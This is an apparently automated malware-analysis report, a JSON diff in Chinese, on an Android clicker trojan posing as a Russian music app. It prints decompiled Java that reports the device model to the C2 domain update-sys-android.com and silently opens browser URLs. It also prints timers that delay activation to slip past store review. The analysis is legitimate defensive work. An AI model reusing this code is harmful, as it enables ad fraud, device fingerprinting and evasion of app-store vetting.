@@ -1,0 +1,150 @@
+{
+  "APK信息": {
+    "文件名": "5733210ca0218b5578e95c289b58b92c14639f4e9a29ad07f0e5528dd4cf21b9.apk",
+    "sha256": "5733210ca0218b5578e95c289b58b92c14639f4e9a29ad07f0e5528dd4cf21b9",
+    "包名": "ru.com.musikavk.slushat",
+    "应用名": "Музыка ВК слушать",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 336.1
+  },
+  "行为列表": [
+    {
+      "行为": "ad_fraud",
+      "中文名": "广告欺诈",
+      "MITRE": "",
+      "置信度": "pdf_reported",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "update-sys-android.com",
+          "WebView",
+          "loadUrl",
+          "NotificationManager",
+          "AlarmManager"
+        ]
+      },
+      "报告来源": "android-malware-clicker-dgen-found-google-play.txt",
+      "恶意代码": [
+        {
+          "class_path": "Lru\\com\\musikavk\\slushat\\AlarmManagerBroadcastReceiver;",
+          "method_signature": "if(packPresent)",
+          "malicious_behavior": "ad_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "boolean packPresent = Utils.checkApp(mContext, mContext.getPackageManager(), this.packName);\nif (packPresent) {\n    url = \"http://update-sys-android.com/upd.php?text=found&model=\" + Build.MODEL;\n} else {\n    url = \"http://update-sys-android.com/upd.php?text=notfound&model=\" + Build.MODEL;\n}\nmContext.startActivity(new Intent(\"android.intent.action.VIEW\", Uri.parse(url)).addFlags(32768).addFlags(268435456));\nint count = readCount(mContext);\nif (count >= this.maxCount) {\n    cancelAlarm(mContext);\n    saveCount(mContext, 0);\n} else {\n    saveCount(mContext, count + 1);\n}",
+          "malicious_code_snippet_context": "          PowerManager.WakeLock wl = pm.newWakeLock(1, \"YOUR TAG\");\n          wl.acquire();\n          if (isOnline(mContext)) {\n>>>             boolean packPresent = Utils.checkApp(mContext, mContext.getPackageManager(), this.packName);\n>>>             if (packPresent) {\n>>>                 url = \"http://update-sys-android.com/upd.php?text=found&model=\" + Build.MODEL;\n>>>             } else {\n>>>                 url = \"http://update-sys-android.com/upd.php?text=notfound&model=\" + Build.MODEL;\n>>>             }\n>>>             mContext.startActivity(new Intent(\"android.intent.action.VIEW\", Uri.parse(url)).addFlags(32768).addFlags(268435456));\n>>>             int count = readCount(mContext);\n>>>             if (count >= this.maxCount) {\n>>>                 cancelAlarm(mContext);\n>>>                 saveCount(mContext, 0);\n>>>             } else {\n>>>                 saveCount(mContext, count + 1);\n>>>             }\n          }\n          wl.release();\n      }",
+          "behavior_description": "该代码是AlarmManager定时触发的广播接收器（配合WakeLock保证执行）。设备联网时，先检测指定包名是否已安装，将检测结果与设备型号拼接为远程服务器URL，然后通过startActivity(ACTION_VIEW)并附加FLAG_ACTIVITY_NEW_TASK标志，在无用户交互的情况下静默拉起浏览器访问该URL，实现隐蔽的广告点击/流量欺诈（与McAfee报告的Android/Clicker.G行为一致）。同时维护本地计数器，达到maxCount上限后自动取消闹钟并重置计数，以规避用户和安全检测。数据流向：Build.MODEL设备型号及目标包安装状态→拼接URL→startActivity静默打开外部链接。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "pdf_reported",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "BOOT_COMPLETED",
+          "RECEIVE_BOOT_COMPLETED",
+          "BroadcastReceiver",
+          "onReceive",
+          "IntentFilter"
+        ]
+      },
+      "报告来源": "android-malware-clicker-dgen-found-google-play.txt",
+      "恶意代码": [
+        {
+          "class_path": "Lru\\com\\musikavk\\slushat\\AlarmManagerBroadcastReceiver;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public class AlarmManagerBroadcastReceiver extends BroadcastReceiver { // 配合 AlarmManager/PendingIntent 注册周期性定时任务 }",
+          "malicious_code_snippet_context": "  import android.os.PowerManager;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class AlarmManagerBroadcastReceiver extends BroadcastReceiver {\n      private static final String TIME = \"time\";\n      private final String LOG_TAG = \"AlarmManagerBroadcastReceiverLT\";\n      private int delayTimeFirst = 21600000;",
+          "behavior_description": "该类是配合 AlarmManager 使用的广播接收器，通过 PendingIntent 注册周期性定时闹钟实现自我唤醒与持久化保活。类中同时引入 ConnectivityManager（检测网络连通状态）、PowerManager（获取唤醒锁防止设备休眠）、SharedPreferences（读取本地/远端下发配置）和 Uri，表明其在被闹钟周期性唤醒后会检查网络并构造 URI 执行后续静默网络操作。该样本已被 McAfee 确认为 Android/Clicker.G 点击欺诈木马（伪装成俄语音乐类应用），此持久化机制使木马在用户无感知的情况下长期驻留后台并周期性自启，为定时广告点击欺诈提供持续运行能力。数据流向：AlarmManager 定时闹钟触发 onReceive → ConnectivityManager 检测网络/SharedPreferences 读取配置 → 重新调度定时任务实现长期保活驻留。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "pdf_reported",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "update-sys-android.com",
+          "HttpURLConnection",
+          "HttpGet",
+          "DefaultHttpClient",
+          "openConnection"
+        ]
+      },
+      "报告来源": "android-malware-clicker-dgen-found-google-play.txt",
+      "恶意代码": [
+        {
+          "class_path": "Lru\\com\\musikavk\\slushat\\AlarmManagerBroadcastReceiver;",
+          "method_signature": "if(packPresent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean packPresent = Utils.checkApp(mContext, mContext.getPackageManager(), this.packName);\nif (packPresent) {\n    url = \"http://update-sys-android.com/upd.php?text=found&model=\" + Build.MODEL;\n} else {\n    url = \"http://update-sys-android.com/upd.php?text=notfound&model=\" + Build.MODEL;\n}\nmContext.startActivity(new Intent(\"android.intent.action.VIEW\", Uri.parse(url)).addFlags(32768).addFlags(268435456));",
+          "malicious_code_snippet_context": "          PowerManager.WakeLock wl = pm.newWakeLock(1, \"YOUR TAG\");\n          wl.acquire();\n          if (isOnline(mContext)) {\n>>>             boolean packPresent = Utils.checkApp(mContext, mContext.getPackageManager(), this.packName);\n>>>             if (packPresent) {\n>>>                 url = \"http://update-sys-android.com/upd.php?text=found&model=\" + Build.MODEL;\n>>>             } else {\n>>>                 url = \"http://update-sys-android.com/upd.php?text=notfound&model=\" + Build.MODEL;\n>>>             }\n>>>             mContext.startActivity(new Intent(\"android.intent.action.VIEW\", Uri.parse(url)).addFlags(32768).addFlags(268435456));\n              int count = readCount(mContext);\n              if (count >= this.maxCount) {\n                  cancelAlarm(mContext);",
+          "behavior_description": "该代码位于AlarmManagerBroadcastReceiver中，由定时Alarm周期性隐蔽触发（配合WakeLock保证执行）。代码检测设备是否安装指定目标包，将检测结果与设备型号Build.MODEL拼接为URL参数，通过startActivity(ACTION_VIEW)隐式调起浏览器访问攻击者控制的伪装域名update-sys-android.com，向C2服务器上报设备指纹信息（设备型号+目标包安装状态），服务器可据此下发任意网页内容（广告/钓鱼/进一步载荷），实现点击欺诈与C2通信。同时通过readCount/saveCount计数器控制触发次数，达到maxCount后调用cancelAlarm停止，属于典型的Android/Clicker.G点击欺诈木马核心载荷。数据流向：Build.MODEL（设备型号）+ Utils.checkApp包安装状态检测 → 拼接进C2服务器URL → startActivity打开URL发送至远程攻击者服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "pdf_reported",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "21600000",
+          "AlarmManager",
+          "SystemClock",
+          "elapsedRealtime",
+          "currentTimeMillis"
+        ]
+      },
+      "报告来源": "android-malware-clicker-dgen-found-google-play.txt",
+      "恶意代码": [
+        {
+          "class_path": "Lru\\com\\musikavk\\slushat\\AlarmManagerBroadcastReceiver;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private int delayTimeFirst = 21600000;\nprivate int delayTime = 120000;\nprivate String packName = \"com.UCMobile.intl\";\nprivate int maxCount = 10000;\npublic void onReceive(Context mContext, Intent intent) {\n    PowerManager pm = (PowerManager) mContext.getSystemService(\"power\");\n    PowerManager.WakeLock wl = pm.newWakeLock(1, \"YOUR TAG\");\n    wl.acquire();\n}",
+          "malicious_code_snippet_context": "  public class AlarmManagerBroadcastReceiver extends BroadcastReceiver {\n      private static final String TIME = \"time\";\n      private final String LOG_TAG = \"AlarmManagerBroadcastReceiverLT\";\n>>>     private int delayTimeFirst = 21600000;\n>>>     private int delayTime = 120000;\n>>>     private String packName = \"com.UCMobile.intl\";\n>>>     private int maxCount = 10000;\n>>> \n>>>     @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context mContext, Intent intent) {\n>>>         String url;\n>>>         PowerManager pm = (PowerManager) mContext.getSystemService(\"power\");\n          PowerManager.WakeLock wl = pm.newWakeLock(1, \"YOUR TAG\");\n          wl.acquire();\n          if (isOnline(mContext)) {",
+          "behavior_description": "该广播接收器是Android/Clicker.G点击器木马的核心调度与反检测模块。数据流向：硬编码配置参数（首次延迟21600000毫秒=6小时、轮询间隔120000毫秒=2分钟、最大执行次数10000次、目标包名com.UCMobile.intl即UC浏览器）→ 通过AlarmManager定时调度 + PowerManager.WakeLock.acquire()强制保活。其反检测体现在：首次激活刻意延迟6小时，以规避Google Play上架审核和沙箱动态分析的检测时间窗口；激活后每2分钟静默触发一次隐蔽点击任务，累计最多10000次；同时持有PARTIAL_WAKE_LOCK确保设备锁屏灭屏状态下CPU持续运行、后台点击不中断，实现广告点击欺诈/推广引流牟利，并造成电量与流量消耗。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
